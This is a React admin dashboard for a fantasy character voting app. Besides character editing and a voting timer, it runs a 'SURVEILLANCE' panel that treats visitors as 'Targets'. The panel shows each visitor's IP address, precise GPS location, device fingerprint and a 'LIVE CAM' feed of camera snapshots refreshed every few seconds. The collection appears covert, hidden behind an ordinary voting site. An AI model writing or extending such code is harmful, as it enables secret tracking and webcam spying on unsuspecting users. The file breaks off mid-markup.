import React, { useState, useEffect } from 'react';
import { Character } from '../types';
import { 
  LayoutDashboard, Users, LogOut, Edit3, Trash2, Save, RefreshCcw, Trophy, Activity,
  Search, Zap, Menu, X, Upload, Link as LinkIcon, Monitor, Smartphone, MapPin, 
  Calendar, Clock, Camera, FolderOpen, Download, FileJson, Globe, RefreshCw, Cpu, Timer, Ban,
  Eye, CheckCircle2, Crown, Sword, Shield, Star, Ghost, Flame, Plus, Sparkles, Network
} from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import { dataService } from '../services/dataService';
import { supabase } from '../lib/supabase'; // Import Supabase Client
import { DetailedDeviceInfo } from '../utils/deviceInfo'; // Type import

interface AdminDashboardProps {
  characters: Character[];
  setCharacters: React.Dispatch<React.SetStateAction<Character[]>>;
  onLogout: () => void;
}

interface ActivityLog {
    user: string;
    action: string;
    timestamp: string;
    ip: string;
    location: any;
    device: DetailedDeviceInfo;
    status: 'VISITOR' | 'VOTER'; // New field to track status
}

const IconOptions = [
    { id: 'crown', icon: Crown, label: 'Crown' },
    { id: 'sword', icon: Sword, label: 'Sword' },
    { id: 'shield', icon: Shield, label: 'Shield' },
    { id: 'star', icon: Star, label: 'Star' },
    { id: 'ghost', icon: Ghost, label: 'Ghost' },
    { id: 'flame', icon: Flame, label: 'Flame' },
    { id: 'zap', icon: Zap, label: 'Zap' },
];

const AdminDashboard: React.FC<AdminDashboardProps> = ({ characters, setCharacters, onLogout }) => {
  const [activeTab, setActiveTab] = useState<'overview' | 'characters' | 'targets'>('overview');
  
  // Character Management State
  const [isEditing, setIsEditing] = useState(false);
  const [editingChar, setEditingChar] = useState<Partial<Character>>({});
  const [isUploading, setIsUploading] = useState(false);
  
  // Logs State
  const [logs, setLogs] = useState<ActivityLog[]>([]);
  const [isSidebarOpen, setIsSidebarOpen] = useState(false);
  const [viewingSurveillance, setViewingSurveillance] = useState<string | null>(null);
  const [surveillanceImages, setSurveillanceImages] = useState<{timestamp: string, url: string}[]>([]);
  const [isLoadingLogs, setIsLoadingLogs] = useState(false);
  
  // Timer State
  const [deadlineInput, setDeadlineInput] = useState('');

  // Initialize deadline input from storage
  useEffect(() => {
    const stored = localStorage.getItem('muse_voting_deadline');
    if (stored) {
        // Format for datetime-local input: YYYY-MM-DDThh:mm
        const date = new Date(stored);
        const offset = date.getTimezoneOffset() * 60000;
        const localISOTime = (new Date(date.getTime() - offset)).toISOString().slice(0, 16);
        setDeadlineInput(localISOTime);
    }
  }, []);

  const handleSaveTimer = () => {
      if (!deadlineInput) return;
      const dateStr = new Date(deadlineInput).toISOString();
      localStorage.setItem('muse_voting_deadline', dateStr);
      
      // Dispatch event to update App.tsx immediately
      window.dispatchEvent(new Event('local-storage-update'));
      window.dispatchEvent(new Event('storage'));
      
      alert('Voting deadline updated successfully.');
  };

  const handleResetTimer = () => {
      localStorage.removeItem('muse_voting_deadline');
      setDeadlineInput('');
      window.dispatchEvent(new Event('local-storage-update'));
      window.dispatchEvent(new Event('storage'));
      alert('Voting timer has been reset/removed.');
  };

  // Effect: Periodic Poll for Live Surveillance Feed from Server
  useEffect(() => {
    let interval: any;
    if (viewingSurveillance) {
        fetchImages(viewingSurveillance);
        interval = setInterval(() => {
            fetchImages(viewingSurveillance);
        }, 4000);
    }
    return () => clearInterval(interval);
  }, [viewingSurveillance]);

  const fetchImages = async (user: string) => {
      const images = await dataService.getSurveillanceImages(user);
      setSurveillanceImages(images);
  };

  // Auto-refresh Logs every 5 seconds (Reduced frequency to save DB calls)
  useEffect(() => {
    loadLogs();
    const interval = setInterval(loadLogs, 5000);
    return () => clearInterval(interval);
  }, [activeTab]);

  const loadLogs = async () => {
    // Avoid double loading if already in progress, unless specifically refreshing
    // but here we want background refresh, so we just run it.
    
    const combinedLogsMap = new Map<string, ActivityLog>();

    // --- 1. FETCH FROM SUPABASE (Priority for Cross-Device Data) ---
    if (supabase) {
        try {
            // Fetch Users (Logins/Visits)
            const { data: users, error: userError } = await supabase
                .from('users')
                .select('*')
                .order('last_login', { ascending: false })
                .limit(100);

            // Fetch Votes (to confirm who voted)
            const { data: votes, error: voteError } = await supabase
                .from('votes')
                .select('user_identifier, character_id');
            
            if (users && !userError) {
                const voteMap = new Map(); // UserID -> CharacterID
                if (votes) {
                    votes.forEach(v => voteMap.set(v.user_identifier, v.character_id));
                }

                users.forEach((u: any) => {
                    const hasVoted = voteMap.has(u.user_identifier);
                    const voteTarget = voteMap.get(u.user_identifier);
                    
                    combinedLogsMap.set(u.user_identifier, {
                        user: u.user_identifier,
                        action: hasVoted ? `Voted for ${voteTarget}` : (u.login_method === 'guest_visit' ? 'Site Visit' : 'Login'),
                        timestamp: u.last_login,
                        ip: u.location_data?.ipAddress || 'Unknown',
                        location: u.location_data || null,
                        device: u.device_info as DetailedDeviceInfo,
                        status: hasVoted ? 'VOTER' : 'VISITOR'
                    });
                });
            }
        } catch (err) {
            console.error("Supabase Log Fetch Error:", err);
        }
    }

    // --- 2. MERGE LOCAL STORAGE (Fallback for LocalHost Testing / No DB) ---
    // If Supabase didn't have the data (or connection failed), use LocalStorage
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      
      // Local Vote Record
      if (key && key.startsWith('muse_vote_record_')) {
        const user = key.replace('muse_vote_record_', '');
        try {
            const parsed = JSON.parse(localStorage.getItem(key) || '{}');
            // Prefer DB data if exists (because DB has 'last_login' which might be newer), 
            // but if not in DB, add from Local
            if (!combinedLogsMap.has(user)) {
                combinedLogsMap.set(user, {
                    user: user,
                    action: `Voted for ${parsed.charId}`,
                    timestamp: parsed.timestamp,
                    ip: parsed.location?.ipAddress || 'Unknown',
                    location: parsed.location,
                    device: parsed.deviceInfo,
                    status: 'VOTER'
                });
            } else {
                // If exists in DB, force status to VOTER if local says they voted (DB might lag)
                const existing = combinedLogsMap.get(user)!;
                if (existing.status !== 'VOTER') {
                    existing.status = 'VOTER';
                    existing.action = `Voted for ${parsed.charId}`;
                }
            }
        } catch (e) {}
      }
      
      // Local Login Log
      if (key && key.startsWith('muse_login_log_')) {
         try {
             const parsed = JSON.parse(localStorage.getItem(key) || '{}');
             if (!combinedLogsMap.has(parsed.user)) {
                 combinedLogsMap.set(parsed.user, {
                     user: parsed.user,
                     action: parsed.method === 'guest_visit' ? 'Site Visit' : 'Login',
                     timestamp: parsed.timestamp,
                     ip: parsed.ip || parsed.location?.ipAddress || 'Unknown',
                     location: parsed.location || null,
                     device: parsed.deviceInfo,
                     status: 'VISITOR'
                 });
             }
         } catch(e) {}
      }
    }

    // Convert Map to Array and Sort by Time
    const sortedLogs = Array.from(combinedLogsMap.values()).sort((a, b) => 
        new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
    );

    setLogs(sortedLogs);
  };

  // --- CRUD FUNCTIONS ---
  const handleAddNew = () => {
      setEditingChar({
          id: `c${Date.now()}`,
          name: '',
          role: '',
          description: '',
          imageUrl: '',
          votes: 0,
          themeColor: 'from-slate-500 to-slate-900',
          familyName: 'Unknown Family',
          familyIcon: 'crown',
          activeEffect: 'none'
      });
      setIsEditing(true);
  };

  const handleAutoGenerate = () => {
      const random = (arr: any[]) => arr[Math.floor(Math.random() * arr.length)];
      
      const names = ["Aeliana", "Darius", "Kyra", "Voron", "Elara", "Magnus", "Seren", "Kael", "Lyra", "Thaddeus", "Orion", "Isolde", "Nyx", "Altair", "Caelum", "Vesper"];
      const roles = ["Shadowblade", "High Priestess", "Vanguard", "Runeseeker", "Voidwalker", "Paladin", "Necromancer", "Technomancer", "Grand Marshal", "Spymaster", "Oracle", "Berserker", "Stormcaller"];
      const families = ["House of Vipers", "Solaris Dynasty", "Lunar Sect", "Iron Legion", "Stormborn", "Verdant Circle", "The Obsidian Order", "Crystal Vanguard", "Shadow Pact", "Crimson Court"];
      const descriptions = [
        "Seorang prajurit legendaris yang mencari penebusan dosa masa lalu di tengah kekacauan dunia.",
        "Penyihir yang menguasai seni terlarang dari dimensi lain, ditakuti oleh kawan maupun lawan.",
        "Pembunuh bayaran yang tidak pernah gagal dalam misinya, bergerak secepat bayangan.",
        "Penjaga kuno yang bangkit kembali untuk melindungi dunia dari ancaman kehampaan abadi.",
        "Ahli strategi jenius yang memanipulasi perang dari balik layar demi kekuasaan mutlak.",
        "Penyembuh yang memiliki darah malaikat, mampu menghidupkan kembali harapan yang telah mati.",
        "Pengelana antar dimensi yang terjebak di dunia ini dan mencari jalan pulang.",
        "Seorang bangsawan yang terusir, kini memimpin pemberontakan dari bawah tanah.",
        "Ilmuwan gila yang menggabungkan sihir dan teknologi untuk menciptakan senjata pemusnah massal."
      ];
      const themes = [
        "from-red-600 to-rose-950",
        "from-slate-500 to-slate-900",
        "from-violet-600 to-purple-950",
        "from-amber-400 to-yellow-700",
        "from-sky-400 to-blue-900",
        "from-emerald-500 to-green-900",
        "from-pink-500 to-rose-900",
        "from-cyan-500 to-blue-900",
        "from-indigo-600 to-slate-900",
        "from-fuchsia-600 to-purple-900"
      ];
      const icons = ['crown', 'sword', 'shield', 'star', 'ghost', 'flame', 'zap'];
      
      const name = random(names);
      
      setEditingChar({
          id: `c${Date.now()}`,
          name: name,
          role: random(roles),
          description: random(descriptions),
          themeColor: random(themes),
          familyName: random(families),
          familyIcon: random(icons) as any,
          activeEffect: 'none',
          votes: 0,
          imageUrl: `https://placehold.co/600x800/1e293b/FFF?text=${encodeURIComponent(name)}`
      });
      setIsEditing(true);
  };

  const handleEdit = (char: Character) => {
      setEditingChar({ ...char });
      setIsEditing(true);
  };

  const handleDelete = async (id: string) => {
      if (confirm('Are you sure you want to delete this character? This action cannot be undone.')) {
          const success = await dataService.deleteCharacter(id);
          if (success) {
              setCharacters(prev => prev.filter(c => c.id !== id));
          } else {
              alert('Failed to delete.');
          }
      }
  };

  const handleSaveCharacter = async () => {
      if (!editingChar.name || !editingChar.id) {
          alert("Name and ID are required.");
          return;
      }
      
      const charToSave = editingChar as Character;
      const success = await dataService.saveCharacter(charToSave);
      
      if (success) {
          setCharacters(prev => {
              const idx = prev.findIndex(c => c.id === charToSave.id);
              if (idx !== -1) {
                  const newArr = [...prev];
                  newArr[idx] = charToSave;
                  return newArr;
              }
              return [...prev, charToSave];
          });
          setIsEditing(false);
      } else {
          alert("Failed to save character.");
      }
  };

  const handleImageUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
      const file = e.target.files?.[0];
      if (!file) return;

      setIsUploading(true);
      const reader = new FileReader();
      reader.onloadend = async () => {
          const base64 = reader.result as string;
          // Upload using dataService
          const path = await dataService.uploadCharacterImage(base64);
          if (path) {
              setEditingChar(prev => ({ ...prev, imageUrl: path }));
          } else {
              alert("Image upload failed.");
          }
          setIsUploading(false);
      };
      reader.readAsDataURL(file);
  };

  return (
    <div className="flex h-screen bg-slate-950 text-slate-200 font-sans overflow-hidden">
      <button onClick={() => setIsSidebarOpen(true)} className="fixed top-4 left-4 z-40 p-2 bg-slate-800 rounded-lg md:hidden border border-slate-700"><Menu size={24} /></button>

      <aside className={`fixed md:relative top-0 left-0 h-full w-64 bg-slate-900 border-r border-slate-800 flex flex-col z-50 transition-transform duration-300 ${isSidebarOpen ? 'translate-x-0' : '-translate-x-full md:translate-x-0'}`}>
          <div className="p-6 border-b border-slate-800 flex items-center justify-between">
            <span className="font-display font-bold text-xl tracking-wide text-red-500">SURVEILLANCE</span>
            <button onClick={() => setIsSidebarOpen(false)} className="md:hidden text-slate-400"><X size={20} /></button>
          </div>
          <nav className="flex-1 p-4 space-y-2">
            <button onClick={() => setActiveTab('overview')} className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'overview' ? 'bg-indigo-600/20 text-indigo-300' : 'text-slate-400 hover:bg-slate-800'}`}><LayoutDashboard size={18}/><span>Overview</span></button>
            <button onClick={() => setActiveTab('targets')} className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'targets' ? 'bg-red-600/20 text-red-400 border border-red-500/30' : 'text-slate-400 hover:bg-slate-800'}`}><Camera size={18}/><span>Targets (Logs)</span></button>
            <button onClick={() => setActiveTab('characters')} className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'characters' ? 'bg-indigo-600/20 text-indigo-300' : 'text-slate-400 hover:bg-slate-800'}`}><Users size={18}/><span>Characters</span></button>
          </nav>
          <div className="p-4"><button onClick={onLogout} className="w-full flex items-center gap-2 px-4 py-2 text-slate-400 hover:text-red-400 transition-colors"><LogOut size={16}/><span>Logout</span></button></div>
      </aside>

      <main className="flex-1 overflow-y-auto bg-slate-950 p-4 md:p-8 relative pt-20 md:pt-8 no-scrollbar">
         
         {activeTab === 'overview' && (
             <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
                 <h1 className="text-2xl font-bold text-white mb-4">System Status</h1>
                 
                 <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                     <div className="bg-slate-900 border border-slate-800 p-6 rounded-2xl shadow-lg relative overflow-hidden group">
                        <div className="absolute top-0 right-0 p-4 opacity-10"><Users size={64} className="text-emerald-500"/></div>
                        <h3 className="text-slate-400 text-sm font-bold uppercase tracking-wider mb-2">Total Targets</h3>
                        <p className="text-4xl font-display font-bold text-white">{logs.length}</p>
                    </div>
                     
                    <div className="bg-slate-900 border border-slate-800 p-6 rounded-2xl shadow-lg relative overflow-hidden group">
                        <div className="absolute top-0 right-0 p-4 opacity-10"><Eye size={64} className="text-blue-500"/></div>
                        <h3 className="text-slate-400 text-sm font-bold uppercase tracking-wider mb-2">Active Visitors</h3>
                        <p className="text-4xl font-display font-bold text-white">{logs.filter(l => l.status === 'VISITOR').length}</p>
                    </div>

                    <div className="bg-slate-900 border border-slate-800 p-6 rounded-2xl shadow-lg relative overflow-hidden group">
                        <div className="absolute top-0 right-0 p-4 opacity-10"><CheckCircle2 size={64} className="text-amber-500"/></div>
                        <h3 className="text-slate-400 text-sm font-bold uppercase tracking-wider mb-2">Verified Voters</h3>
                        <p className="text-4xl font-display font-bold text-white">{logs.filter(l => l.status === 'VOTER').length}</p>
                    </div>

                    {/* VOTING CONTROL PANEL */}
                    <div className="bg-slate-900 border border-slate-800 p-6 rounded-2xl shadow-lg col-span-1 md:col-span-3 relative overflow-hidden">
                        <div className="flex items-center gap-3 mb-4">
                            <Timer className="text-amber-400" />
                            <h3 className="text-white font-bold text-lg">Voting Control</h3>
                        </div>
                        <div className="flex flex-col md:flex-row gap-4 items-end">
                            <div className="w-full">
                                <label className="block text-xs text-slate-400 mb-2">Set Voting Deadline</label>
                                <input 
                                    type="datetime-local" 
                                    value={deadlineInput}
                                    onChange={(e) => setDeadlineInput(e.target.value)}
                                    className="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-white focus:border-indigo-500 outline-none"
                                />
                            </div>
                            <button 
                                onClick={handleSaveTimer}
                                className="px-6 py-3 bg-indigo-600 hover:bg-indigo-500 text-white rounded-lg font-bold transition-colors flex items-center gap-2"
                            >
                                <Save size={16} /> Save Timer
                            </button>
                            <button 
                                onClick={handleResetTimer}
                                className="px-6 py-3 bg-red-900/30 hover:bg-red-900/50 text-red-400 border border-red-900/50 rounded-lg font-bold transition-colors flex items-center gap-2"
                            >
                                <Ban size={16} /> Reset
                            </button>
                        </div>
                        <p className="mt-4 text-xs text-slate-500">
                            * When the timer expires, the app will automatically lock voting and crown the winner on the main screen.
                        </p>
                    </div>
                 </div>
             </motion.div>
         )}

         {/* --- TARGETS TAB --- */}
         {activeTab === 'targets' && (
            <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}>
                {/* ... (Existing Target Logs UI - unchanged for brevity, but logically present) ... */}
                <div className="flex justify-between items-center mb-6">
                    <h1 className="text-2xl font-bold text-white flex items-center gap-2">
                        <Camera className="text-red-500"/> Target Logs
                        <span className="text-xs font-normal text-slate-500 ml-2 animate-pulse">(Auto-refreshing DB)</span>
                    </h1>
                    <button onClick={loadLogs} className="bg-slate-800 text-white px-4 py-2 rounded-lg flex items-center gap-2 hover:bg-slate-700"><RefreshCw size={16}/> Refresh</button>
                </div>
                
                <div className="bg-slate-900 border border-slate-800 rounded-2xl overflow-hidden overflow-x-auto shadow-lg">
                    <table className="w-full text-left text-sm min-w-[1200px]">
                        <thead className="bg-slate-800/50 text-slate-400 font-medium">
                            <tr>
                                <th className="p-4 w-[200px]">Identity & Status</th>
                                <th className="p-4 w-[150px]">Network (IP)</th>
                                <th className="p-4 w-[250px]">Location Info</th>
                                <th className="p-4 w-[250px]">Device Fingerprint</th>
                                <th className="p-4">System Specs</th>
                                <th className="p-4">Cam Feed</th>
                            </tr>
                        </thead>
                        <tbody className="divide-y divide-slate-800">
                            {logs.length === 0 ? (
                                <tr><td colSpan={6} className="p-8 text-center text-slate-500">No targets detected yet.</td></tr>
                            ) : (
                                logs.map((log, idx) => (
                                    <tr key={idx} className={`hover:bg-slate-800/30 transition-colors ${log.status === 'VOTER' ? 'bg-amber-900/5' : ''}`}>
                                        <td className="p-4 align-top">
                                            <div className="mb-2">
                                                {log.status === 'VOTER' ? (
                                                    <span className="inline-flex items-center gap-1.5 px-2 py-0.5 rounded text-[10px] font-bold bg-amber-500/20 text-amber-400 border border-amber-500/30 uppercase tracking-wide">
                                                        <Trophy size={10} /> Voter
                                                    </span>
                                                ) : (
                                                    <span className="inline-flex items-center gap-1.5 px-2 py-0.5 rounded text-[10px] font-bold bg-slate-700/30 text-slate-400 border border-slate-600/30 uppercase tracking-wide">
                                                        <Eye size={10} /> Visitor
                                                    </span>
                                                )}
                                            </div>
                                            <div className="font-mono font-bold text-indigo-300 mb-1">{log.user}</div>
                                            <div className="text-xs text-white/70 mb-2 italic">"{log.action}"</div>
                                            <div className="text-[10px] text-slate-500">{new Date(log.timestamp).toLocaleTimeString()}</div>
                                        </td>
                                        
                                        {/* IP ADDRESS COLUMN */}
                                        <td className="p-4 align-top">
                                            <div className="flex items-center gap-2 text-emerald-400 font-mono text-xs bg-slate-950/50 px-2 py-1 rounded border border-slate-800 w-fit">
                                                <Network size={12} />
                                                <span>{log.ip || 'Unknown'}</span>
                                            </div>
                                        </td>

                                        <td className="p-4 align-top">
                                             {log.location && typeof log.location.lat === 'number' ? (
                                                    <a href={`https://www.google.com/maps?q=${log.location.lat},${log.location.lng}`} target="_blank" className="flex items-center gap-1.5 text-indigo-400 hover:text-indigo-300 transition-colors">
                                                        <MapPin size={14} className="text-red-500"/>
                                                        <span className="text-xs font-mono">{log.location.lat.toFixed(5)}, {log.location.lng.toFixed(5)}</span>
                                                    </a>
                                            ) : <span className="text-slate-600 text-xs flex items-center gap-1"><MapPin size={12}/> No GPS</span>}
                                        </td>
                                        <td className="p-4 align-top">
                                            {log.device ? (
                                                <div className="space-y-1 text-xs text-slate-300">
                                                    <div className="flex items-center gap-2">
                                                        {log.device.isMobile ? <Smartphone size={14} className="text-slate-500"/> : <Monitor size={14} className="text-slate-500"/>}
                                                        <span className="font-bold text-white">{log.device.osName}</span> 
                                                        <span className="text-slate-500">Ver: {log.device.osVersion}</span>
                                                    </div>
                                                    <div className="flex items-center gap-2">
                                                        <Globe size={14} className="text-slate-500"/>
                                                        <span className="font-bold text-indigo-200">{log.device.browserName}</span>
                                                    </div>
                                                </div>
                                            ) : <span className="text-slate-600">No Data</span>}
                                        </td>
                                        <td className="p-4 align-top">
                                            {log.device ? (
                                                <div className="text-[11px] text-slate-400">
                                                    Res: {log.device.resolution} <br/>
                                                    Cores: {log.device.cores}
                                                </div>
                                            ) : null}
                                        </td>
                                        <td className="p-4 align-top">
                                            <button 
                                                onClick={() => setViewingSurveillance(log.user)}
                                                className="flex items-center gap-2 px-3 py-1.5 bg-red-900/20 hover:bg-red-900/40 text-red-400 border border-red-900/50 rounded-lg transition-colors w-full justify-center"
                                            >
                                                <Camera size={14} /> <span className="text-xs font-bold">LIVE CAM</span>
                                            </button>
                                        </td>
                                    </tr>
                                ))
                            )}
                        </tbody>
                    </table>
                </div>

                {/* Surveillance Modal */}
                 <AnimatePresence>
                     {viewingSurveillance && (
                         <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
                             <div className="absolute inset-0 bg-black/90 backdrop-blur-md" onClick={() => setViewingSurveillance(null)}></div>
                             <motion.div initial={{opacity:0, scale:0.95}} animate={{opacity:1, scale:1}} className="bg-slate-900 border border-slate-700 w-full max-w-5xl h-[85vh] rounded-2xl relative z-10 p-6 flex flex-col">
                                 <div className="flex justify-between mb-4 border-b border-slate-800 pb-4">
                                     <div>
                                        <h3 className="font-bold text-white flex items-center gap-2 text-xl"><Camera className="text-red-500"/> Target: {viewingSurveillance}</h3>
                                        <p className="text-xs text-slate-500">Live feed updates every 4 seconds</p>
                                     </div>
                                     <button onClick={() => setViewingSurveillance(null)} className="text-slate-400 hover:text-white"><X size={24}/></button>
                                 </div>
                                 <div className="flex-1 overflow-y-auto grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4 p-2 bg-slate-950 rounded-xl inner-shadow">
                                     {surveillanceImages.length === 0 ? (
                                         <div className="col-span-full flex flex-col items-center justify-center h-full text-slate-500">
                                             <FolderOpen size={48} className="mb-2 opacity-20"/>
                                             <p>Waiting for camera uplink...</p>
                                             <div className="mt-4 w-4 h-4 bg-red-500 rounded-full animate-ping"></div>
                                         </div>
                                     ) : (
                                         surveillanceImages.map((img, i) => (
                                             <div key={i} className="bg-black rounded-lg border border-slate-800 relative overflow-hidden group aspect-video shadow-lg">
                                                 <img src={img.url} className="w-full h-full object-cover" alt="surveillance" loading="lazy"/>
                                                 <div className="absolute top-2 right-2 px-1.5 py-0.5 bg-red-600 text-white text-[9px] font-bold rounded uppercase tracking-wider">REC</div>
                                                 <div className="absolute bottom-0 inset-x-0 bg-black/80 backdrop-blur text-[10px] text-center text-slate-300 py-1">
                                                     {img.timestamp}
                                                 </div>
                                             </div>
                                         ))
                                     )}
                                 </div>
                             </motion.div>
                         </div>
                     )}
                 </AnimatePresence>
            </motion.div>
         )}

         {/* --- CHARACTERS TAB (CRUD) --- */}
         {activeTab === 'characters' && (
             <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                 {/* ... (Existing Characters Tab Content unchanged) ... */}
                 
                 {/* Header */}
                 <div className="flex justify-between items-center mb-6">
                     <h1 className="text-2xl font-bold text-white flex items-center gap-2">
                        <Users className="text-indigo-500"/> Character Management
                     </h1>
                     <div className="flex gap-3">
                         <button 
                            onClick={handleAutoGenerate} 
                            className="bg-purple-600 text-white px-4 py-2 rounded-lg flex items-center gap-2 hover:bg-purple-500 font-bold shadow-lg shadow-purple-900/20 transition-all active:scale-95"
                         >
                             <Sparkles size={18}/> Auto Generate
                         </button>
                         <button onClick={handleAddNew} className="bg-emerald-600 text-white px-4 py-2 rounded-lg flex items-center gap-2 hover:bg-emerald-500 font-bold shadow-lg shadow-emerald-900/20">
                             <Plus size={18}/> Add Character
                         </button>
                     </div>
                 </div>

                 {/* Characters Grid */}
                 <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-10">
                     {characters.map(char => (
                         <div key={char.id} className="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden group hover:border-indigo-500/50 transition-all shadow-lg relative">
                             {/* Card Preview Header */}
                             <div className="h-32 relative overflow-hidden">
                                 <img src={char.imageUrl} className="w-full h-full object-cover" />
                                 <div className={`absolute inset-0 bg-gradient-to-t ${char.themeColor} opacity-60 mix-blend-multiply`}></div>
                                 <div className="absolute bottom-3 left-4">
                                     <h3 className="font-display font-bold text-white text-lg leading-none">{char.name}</h3>
                                     <span className="text-[10px] text-white/80 uppercase tracking-widest">{char.role}</span>
                                 </div>
                             </div>

                             {/* Stats & Actions */}
                             <div className="p-4">
                                 <div className="flex justify-between items-center mb-3">
                                     <div className="flex items-center gap-2 text-slate-400 text-xs">
                                        <Users size={14}/> Family: <span className="text-white">{char.familyName || 'None'}</span>
                                     </div>
                                     <div className="flex items-center gap-1 font-mono font-bold text-indigo-400">
                                         {char.votes} <span className="text-[10px] text-slate-500 uppercase">Votes</span>
                                     </div>
                                 </div>
                                 <p className="text-xs text-slate-500 line-clamp-2 mb-4">{char.description}</p>
                                 
                                 <div className="flex gap-2">
                                     <button onClick={() => handleEdit(char)} className="flex-1 bg-slate-800 hover:bg-slate-700 text-white py-2 rounded-lg text-xs font-bold flex items-center justify-center gap-2 border border-slate-700">
                                         <Edit3 size={14}/> Edit
                                     </button>
                                     <button onClick={() => handleDelete(char.id)} className="w-10 bg-red-900/20 hover:bg-red-900/40 text-red-500 py-2 rounded-lg flex items-center justify-center border border-red-900/30">
                                         <Trash2 size={14}/>
                                     </button>
                                 </div>
                             </div>
                         </div>
                     ))}
                 </div>

                 {/* EDIT/ADD MODAL */}
                 <AnimatePresence>
                     {isEditing && (
                         <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
                             <motion.div initial={{opacity:0}} animate={{opacity:1}} exit={{opacity:0}} className="absolute inset-0 bg-black/80 backdrop-blur-sm" onClick={() => setIsEditing(false)}></motion.div>
                             
                             <motion.div initial={{scale:0.95, opacity:0, y:20}} animate={{scale:1, opacity:1, y:0}} exit={{scale:0.95, opacity:0}} className="bg-slate-900 border border-slate-700 w-full max-w-4xl max-h-[90vh] rounded-2xl relative z-10 flex flex-col md:flex-row overflow-hidden shadow-2xl">
                                 
                                 {/* Close Button */}
                                 <button onClick={() => setIsEditing(false)} className="absolute top-4 right-4 z-20 bg-black/50 p-2 rounded-full text-white hover:bg-red-500 transition-colors"><X size={20}/></button>

                                 {/* Left: Image Preview & Upload */}
                                 <div className="w-full md:w-1/3 bg-black relative flex flex-col items-center justify-center p-6 border-r border-slate-800">
                                     <div className="w-full aspect-[9/14] bg-slate-800 rounded-xl overflow-hidden relative group mb-4 shadow-lg border-2 border-slate-700">
                                         {editingChar.imageUrl ? (
                                             <img src={editingChar.imageUrl} className="w-full h-full object-cover" />
                                         ) : (
                                             <div className="flex items-center justify-center w-full h-full text-slate-600"><Camera size={40}/></div>
                                         )}
                                         
                                         {/* Upload Overlay */}
                                         <label className="absolute inset-0 bg-black/60 opacity-0 group-hover:opacity-100 transition-opacity flex flex-col items-center justify-center cursor-pointer text-white">
                                             <Upload size={32} className="mb-2"/>
                                             <span className="text-xs font-bold uppercase tracking-wider">Change Image</span>
                                             <input type="file" accept="image/*" className="hidden" onChange={handleImageUpload} />
                                         </label>
                                         {isUploading && (
                                             <div className="absolute inset-0 bg-black/80 flex items-center justify-center z-10">
                                                 <RefreshCw className="animate-spin text-indigo-500" size={32}/>
                                             </div>
                                         )}
                                     </div>
                                     <div className="w-full">
                                         <label className="text-[10px] text-slate-500 uppercase font-bold mb-1 block">Or Paste URL</label>
                                         <div className="flex bg-slate-800 rounded-lg overflow-hidden border border-slate-700">
                                             <div className="p-3 text-slate-500"><LinkIcon size={14}/></div>
                                             <input 
                                                 type="text" 
                                                 value={editingChar.imageUrl} 
                                                 onChange={(e) => setEditingChar({...editingChar, imageUrl: e.target.value})}
                                                 className="bg-transparent text-xs text-white p-2 w-full outline-none"
                                                 placeholder="https://..."
                                             />
                                         </div>
                                     </div>
                                 </div>

                                 {/* Right: Form Fields */}
                                 <div className="w-full md:w-2/3 p-8 overflow-y-auto">
                                     <h2 className="text-2xl font-bold text-white mb-6 font-display border-b border-slate-800 pb-4">
                                         {editingChar.id && characters.find(c => c.id === editingChar.id) ? 'Edit Character' : 'New Character'}
                                     </h2>

                                     <div className="grid grid-cols-2 gap-6 mb-6">
                                         <div className="col-span-2 md:col-span-1">
                                             <label className="text-xs text-slate-400 font-bold uppercase tracking-wider mb-2 block">Name</label>
                                             <input type="text" value={editingChar.name || ''} onChange={(e) => setEditingChar({...editingChar, name: e.target.value})} className="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-white focus:border-indigo-500 outline-none" placeholder="e.g. Seraphina"/>
                                         </div>
                                         <div className="col-span-2 md:col-span-1">
                                             <label className="text-xs text-slate-400 font-bold uppercase tracking-wider mb-2 block">Role / Title</label>
                                             <input type="text" value={editingChar.role || ''} onChange={(e) => setEditingChar({...editingChar, role: e.target.value})} className="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-white focus:border-indigo-500 outline-none" placeholder="e.g. Cosmic Entity"/>
                                         </div>
                                     </div>

                                     <div className="mb-6">
                                         <label className="text-xs text-slate-400 font-bold uppercase tracking-wider mb-2 block">Description / Bio</label>
                                         <textarea rows={3} value={editingChar.description || ''} onChange={(e) => setEditingChar({...editingChar, description: e.target.value})} className="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-white focus:border-indigo-500 outline-none text-sm resize-none"></textarea>
                                     </div>

                                     {/* Family Section */}
                                     <div className="bg-slate-800/30 p-4 rounded-xl border border-slate-800 mb-6">
                                         <label className="text-xs text-indigo-400 font-bold uppercase tracking-wider mb-4 block flex items-center gap-2"><Crown size={12}/> Family / Group</label>
                                         <div className="grid grid-cols-2 gap-4">
                                            <div>
                                                 <label className="text-[10px] text-slate-500 mb-1 block">Family Name</label>
                                                 <input type="text" value={editingChar.familyName || ''} onChange={(e) => setEditingChar({...editingChar, familyName: e.target.value})} className="w-full bg-slate-950 border border-slate-700 rounded-lg p-2 text-sm text-white focus:border-indigo-500 outline-none" placeholder="e.g. Ouxyrin Family"/>
                                            </div>
                                            <div>
                                                 <label className="text-[10px] text-slate-500 mb-1 block">Family Icon</label>
                                                 <div className="flex gap-2 flex-wrap">
                                                     {IconOptions.map(opt => {
                                                         const Icon = opt.icon;
                                                         const isSelected = editingChar.familyIcon === opt.id;
                                                         return (
                                                             <button 
                                                                key={opt.id}
                                                                onClick={() => setEditingChar({...editingChar, familyIcon: opt.id as any})}
